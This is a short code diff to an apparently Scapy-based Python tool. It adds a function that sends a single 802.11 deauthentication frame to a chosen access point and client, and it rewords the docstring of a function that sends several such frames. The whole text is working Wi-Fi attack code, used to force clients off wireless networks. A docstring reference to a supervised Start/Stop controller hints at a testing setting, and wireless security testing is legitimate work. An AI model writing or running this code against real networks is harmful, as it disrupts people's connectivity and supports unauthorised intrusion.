@@ -23,8 +23,14 @@ def build_deauth_packet(ap_mac: str, target_mac: str):
     return RadioTap() / dot11 / Dot11Deauth(reason=DEFAULT_DEAUTH_REASON)
 
 
+def send_deauth_frame(ap_mac: str, target_mac: str, iface: str) -> None:
+    """Send one frame for the supervised bounded Start/Stop controller."""
+    packet = build_deauth_packet(ap_mac, target_mac)
+    sendp(packet, iface=iface, count=1, inter=0, verbose=False)
+
+
 def deauth(ap_mac: str, target_mac: str, iface: str, frames: int = 10) -> None:
-    """Send 802.11 deauthentication frames.
+    """Send a fixed number of 802.11 deauthentication frames.
 
     Parameters
     ----------
